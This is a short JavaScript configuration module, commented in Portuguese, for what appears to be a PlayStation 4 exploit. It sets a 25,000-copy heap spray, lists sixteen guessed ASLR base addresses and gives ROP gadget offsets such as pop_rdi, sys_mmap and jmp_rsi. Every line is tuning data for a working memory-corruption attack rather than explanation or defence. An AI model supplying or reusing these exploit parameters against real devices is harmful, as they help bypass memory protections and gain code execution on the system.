export const CONFIG = {
    // Limite de segurança (Worker 406 travou no seu teste anterior)
    WORKER_LIMIT: 406,
    
    // Quantidade de sprays (25 mil cópias para garantir o Rainbow)
    SPRAY_QUANTITY: 25000,

    // As 16 bases mais prováveis do ASLR no PS4
    TARGET_BASES: [
        0x800000000n, 0x800004000n, 0x800010000n, 
        0x800400000n, 0x800800000n, 0x801000000n,
        0x820000000n, 0x820004000n, 0x820010000n, // O seu "Golden" está aqui
        0x880000000n, 0x880004000n, 0x880010000n,
        0x900000000n, 0x920000000n, 0x940000000n, 
        0x200000000n
    ]
};

export const GADGETS = {
    pop_rdi: 0x2FEB5n,
    sys_mmap: 0x7500n,
    jmp_rsi: 0x47b31n,
    kl_lock: 0xE6C20n
};
